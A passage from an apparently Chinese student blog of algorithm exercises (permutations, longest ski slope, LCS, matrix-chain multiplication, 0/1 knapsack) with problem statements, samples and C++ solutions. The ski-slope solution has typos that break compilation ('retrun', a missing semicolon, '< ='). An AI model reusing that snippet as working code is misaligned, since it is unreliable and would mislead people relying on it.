class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">solve(a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="排列问题"><a href="#排列问题" class="headerlink" title="排列问题"></a>排列问题</h3><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>输入一个可能含有重复字符的字符串，打印出该字符串中所有字符的全排列。</p><h5 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h5><p>单组测试数据，输入数据是一个长度不超过10个字符的字符串，以逗号结尾。</p><h5 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h5><p>打印出该字符串中所有字符的全排列。以字典序顺序输出，用空格分隔。</p><h5 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc,</span><br></pre></td></tr></table></figure><h5 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc acb bac bca cab cba</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"><span class="keyword">int</span> lena = <span class="built_in">strlen</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lena<span class="number">-1</span>; i++ ) &#123; <span class="built_in">cout</span> &lt;&lt; a[i]; &#125; <span class="built_in">cout</span> &lt;&lt; <span class="string">" "</span>; </span><br><span class="line">&#125; <span class="keyword">while</span>( next_permutation(a, a+lena<span class="number">-1</span>) );  <span class="comment">//关键是这个函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Perm</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">list</span>,<span class="keyword">int</span> k,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>( k == m)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ;i &lt;= m; i++) <span class="built_in">cout</span>&lt;&lt;<span class="built_in">list</span>[i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=k; i&lt;=m; i++)&#123;</span><br><span class="line">swap(<span class="built_in">list</span>[k],<span class="built_in">list</span>[i]);</span><br><span class="line">Perm(<span class="built_in">list</span>,k+<span class="number">1</span>,m);</span><br><span class="line">swap(<span class="built_in">list</span>[k],<span class="built_in">list</span>[i]);  <span class="comment">//关键是换位之后记得还原现场</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"><span class="keyword">int</span> lena = <span class="built_in">strlen</span>(a);</span><br><span class="line">a[lena<span class="number">-1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">lena  = <span class="built_in">strlen</span>(a);</span><br><span class="line">sort(a,a+lena);</span><br><span class="line">Perm(a,<span class="number">0</span>,lena<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="矩形滑雪场"><a href="#矩形滑雪场" class="headerlink" title="矩形滑雪场"></a>矩形滑雪场</h3><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>zcb喜欢滑雪。他来到了一个滑雪场，这个滑雪场是一个矩形，为了简便，我们用r行c列的矩阵来表示每块地形。为了得到更快的速度，滑行的路线必须向下倾斜。 例如样例中的那个矩形，可以从某个点滑向上下左右四个相邻的点之一。例如24-17-16-1，其实25-24-23…3-2-1更长，事实上这是最长的一条。</p><h5 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h5><p>第1行:两个数字r，c(1 ≤ r, c ≤ 100)，表示矩阵的行列。第2..r+1行:每行c个数，表示这个矩阵。</p><h5 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h5><p>仅一行:输出1个整数，表示可以滑行的最大长度。</p><h5 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5 5</span><br><span class="line">1 2 3 4 5</span><br><span class="line">16 17 18 19 6</span><br><span class="line">15 24 25 20 7</span><br><span class="line">14 23 22 21 8</span><br><span class="line">13 12 11 10 9</span><br></pre></td></tr></table></figure><h5 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> r,c;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="keyword">int</span> record[<span class="number">105</span>][<span class="number">105</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m_x[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m_y[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(record[x][y]) <span class="keyword">return</span> record[x][y];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> i&lt; <span class="number">4</span> ;i++)&#123;  <span class="comment">//往四个方向深搜</span></span><br><span class="line"><span class="keyword">int</span> wx = x+ m_x[i];</span><br><span class="line"><span class="keyword">int</span> wy = y+ m_y[i];</span><br><span class="line"><span class="keyword">if</span>(wx &gt;= <span class="number">1</span> &amp;&amp; wx &lt;= r &amp;&amp; wy &gt;=<span class="number">1</span> &amp;&amp; wy&lt;= c &amp;&amp; m[x][y] &gt; m[wx][wy])&#123;</span><br><span class="line">record[x][y] = max(record[x][y], dfs(wx,wy)+<span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> record[x][y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;r&gt;&gt;c;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt;=r ;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j&lt;=c;j++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;m[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> result  =<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt; = r; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span> ; j&lt;=c;j++)&#123;</span><br><span class="line">record[i][j] = dfs(i,j);</span><br><span class="line">result = max(record[i][j],result);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result + <span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">retrun <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p>这种题目关键记住dp公式就好书上都有不多说</p><h3 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h3><h4 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</p><h5 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h5><p>输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。</p><h5 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h5><p>对于每组输入，输出两个字符串的最长公共子序列的长度。</p><h5 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcfbc abfcab</span><br><span class="line">programming contest </span><br><span class="line">abcd mnp</span><br></pre></td></tr></table></figure><h5 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">2</span><br><span class="line">0</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> c[<span class="number">2005</span>][<span class="number">2005</span>];</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">2005</span>][<span class="number">2005</span>];</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">2005</span>],b[<span class="number">2005</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*构造最优解*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LCS</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i ==<span class="number">0</span>|| j==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(m[i][j] == <span class="number">1</span>)&#123;</span><br><span class="line">LCS(i<span class="number">-1</span>,j<span class="number">-1</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a[i<span class="number">-1</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(m[i][j] == <span class="number">2</span>)&#123;</span><br><span class="line">LCS(i<span class="number">-1</span>,j);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">LCS(i,j<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> lena,<span class="keyword">int</span> lenb)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i &lt;=lena ;i++)&#123;</span><br><span class="line">c[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">0</span>;j&lt;=lenb;j++)&#123;</span><br><span class="line">c[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=lena;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=lenb;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i<span class="number">-1</span>] == b[j<span class="number">-1</span>]) &#123;</span><br><span class="line">c[i][j] = c[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">m[i][j] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(c[i<span class="number">-1</span>][j] &gt;= c[i][j<span class="number">-1</span>])&#123;</span><br><span class="line">c[i][j] = c[i<span class="number">-1</span>][j];</span><br><span class="line">m[i][j] =<span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">c[i][j] = c[i][j<span class="number">-1</span>];</span><br><span class="line">m[i][j] = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; c[lena][lenb]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//LCS(lena,lenb);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line"><span class="keyword">int</span> lena = <span class="built_in">strlen</span>(a);</span><br><span class="line"><span class="keyword">int</span> lenb = <span class="built_in">strlen</span>(b);</span><br><span class="line">solve(lena,lenb);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="矩阵连乘"><a href="#矩阵连乘" class="headerlink" title="矩阵连乘"></a>矩阵连乘</h3><h4 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定n个矩阵{A1,A2,…,An}，及m个矩阵连乘的表达式，判断每个矩阵连乘表达式是否满足矩阵乘法法则，如果满足，则计算矩阵的最小连乘次数，如果不满足输出“MengMengDa“。</p><h5 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h5><p>输入数据由多组数据组成（不超过10组样例）。每组数据格式如下：<br>第一行是2个整数n (1≤n≤26)和m(1≤m≤3)，表示矩阵的个数。<br>接下来n行，每行有一个大写字母，表示矩阵的名字，后面有两个整数r和c，分别表示该矩阵的行数和列数，其中1 &lt; r, c<br>第n+1行到第n+m行，每行是一个矩阵连乘的表达式(2&lt;=矩阵个数&lt;=100)。</p><h5 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h5><p>对于每个矩阵连乘表达式，如果运算不满足矩阵乘法法则的情况（即左矩阵列数与右矩阵的行数不同），则输出“MengMengDa”，否则输出最小矩阵连乘次数。</p><p>数据保证结果不超过1e9。</p><h5 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3 2</span><br><span class="line">A 10 100</span><br><span class="line">B 5 50</span><br><span class="line">C 100 5</span><br><span class="line">ACB</span><br><span class="line">ABC</span><br></pre></td></tr></table></figure><h5 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7500</span><br><span class="line">MengMengDa</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">26</span>][<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Matrix</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> r,c;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> p[],<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>; i&lt;=len;i++) m[i][i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> r =<span class="number">2</span>; r&lt;=len;r++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= len-r+<span class="number">1</span>; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> j = i + r<span class="number">-1</span>;</span><br><span class="line">m[i][j] = m[i+<span class="number">1</span>][j] + p[i<span class="number">-1</span>]*p[i]*p[j];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k =i+<span class="number">1</span> ;k &lt; j; k++)&#123;</span><br><span class="line">m[i][j] = min(m[i][j],m[i][k]+m[k+<span class="number">1</span>][j]+p[i<span class="number">-1</span>]*p[k]*p[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[<span class="number">1</span>][len]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,l;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;l)&#123;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">char</span>,Matrix&gt;my_map;</span><br><span class="line"><span class="keyword">int</span> p[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line"><span class="keyword">char</span> a;</span><br><span class="line"><span class="keyword">int</span> j,k;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a&gt;&gt;j&gt;&gt;k;</span><br><span class="line">Matrix tmp ;</span><br><span class="line">tmp.r = j;</span><br><span class="line">tmp.c = k;</span><br><span class="line">my_map[a] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> words[<span class="number">101</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; l; i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;words;</span><br><span class="line"><span class="keyword">int</span> lenw = <span class="built_in">strlen</span>(words);</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">p[<span class="number">0</span>] = my_map[words[<span class="number">0</span>]].r;</span><br><span class="line">p[<span class="number">1</span>] = my_map[words[<span class="number">0</span>]].c;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span>; j &lt; lenw;j++)&#123; <span class="comment">//注意 </span></span><br><span class="line"><span class="keyword">if</span>(my_map[words[j]].r != my_map[words[j<span class="number">-1</span>]].c)&#123;</span><br><span class="line">flag  =<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">p[j+<span class="number">1</span>] = my_map[words[j]].c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag == <span class="number">1</span>) <span class="built_in">puts</span>(<span class="string">"MengMengDa"</span>);</span><br><span class="line"><span class="keyword">else</span> solve(p,lenw);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="01背包-考试考了类似的"><a href="#01背包-考试考了类似的" class="headerlink" title="01背包(考试考了类似的)"></a>01背包(考试考了类似的)</h3><h4 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h4><p>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p><h5 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h5><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</p><p>接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围）</p><h5 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h5><p>对每组测试数据，输出其对应的所装物品的最大价值。</p><h5 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">10 5</span><br><span class="line">2 6</span><br><span class="line">2 3</span><br><span class="line">6 5</span><br><span class="line">5 4</span><br><span class="line">4 6</span><br></pre></td></tr></table></figure><h5 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 